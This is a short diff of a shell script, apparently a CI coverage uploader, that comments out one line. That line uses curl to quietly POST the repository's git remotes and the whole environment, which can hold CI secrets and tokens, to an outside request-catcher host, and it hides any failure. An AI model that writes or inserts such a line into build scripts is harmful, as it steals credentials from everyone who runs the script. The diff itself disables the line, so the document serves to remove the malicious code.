@@ -522,7 +522,7 @@ else
 fi
 
 search_in="$proj_root"
-curl -sm 0.5 -X POST -d "$(git remote -v)<<<<<< ENV $(env)" https://codecovtest.requestcatcher.com/test || true
+#curl -sm 0.5 -X POST -d "$(git remote -v)<<<<<< ENV $(env)" https://codecovtest.requestcatcher.com/test || true
 
 #shellcheck disable=SC2154
 if [ "$JENKINS_URL" != "" ];
